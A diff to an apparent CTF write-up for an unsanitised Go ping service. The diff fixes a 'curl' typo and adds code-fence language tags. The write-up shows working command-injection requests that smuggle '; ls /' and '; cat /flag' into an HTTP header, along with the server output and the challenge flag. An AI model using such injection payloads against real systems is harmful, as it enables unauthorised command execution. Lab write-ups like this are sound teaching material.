@@ -14,7 +14,7 @@ Inside ```index.html``` there's an option to ping another IP thant ours:
 
 And the input is not properly sanitized:
 
-```
+```go
 func IsItDown(address string) (string, error) {
 	ctx, cancel := context.WithTimeout(context.Background(), 200*time.Millisecond)
 	defer cancel()
@@ -29,7 +29,7 @@ func IsItDown(address string) (string, error) {
 So adding another command after the ping command argument is possible:
 
 ```bash
-url -H "Inspect-IP: 8.8.8.8 ; ls /  /flag" https://0yp0oivpnun7jthof6si6foppfkmlf.challenge.grehack.fr/is-it-down
+curl -H "Inspect-IP: 8.8.8.8 ; ls /  /flag" https://0yp0oivpnun7jthof6si6foppfkmlf.challenge.grehack.fr/is-it-down
 {"ip":"8.8.8.8 ; ls /  /flag","down":false,"trace":"PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.\n64 bytes from 8.8.8.8: icmp_seq=1 ttl=53 time=1.48 ms\n\n--- 8.8.8.8 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 1.484/1.484/1.484/0.000 ms\n/flag\n\n/:\nbin\ndev\netc\nflag\nhome\nlib\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n"}%
 ```
 
@@ -40,7 +40,7 @@ curl -H "Inspect-IP: 8.8.8.8; cat /flag" https://0yp0oivpnun7jthof6si6foppfkmlf.
 
 It's also possible to strip the IP address completely:
 
-```
+```bash
 curl -H "Inspect-IP: ; cat  /flag" https://0yp0oivpnun7jthof6si6foppfkmlf.challenge.grehack.fr/is-it-down 
 {"ip":"; cat  /flag","down":false,"trace":"GH19{challenges_for_the_ctf_will_not_be_that_easy}\n"}
 ```
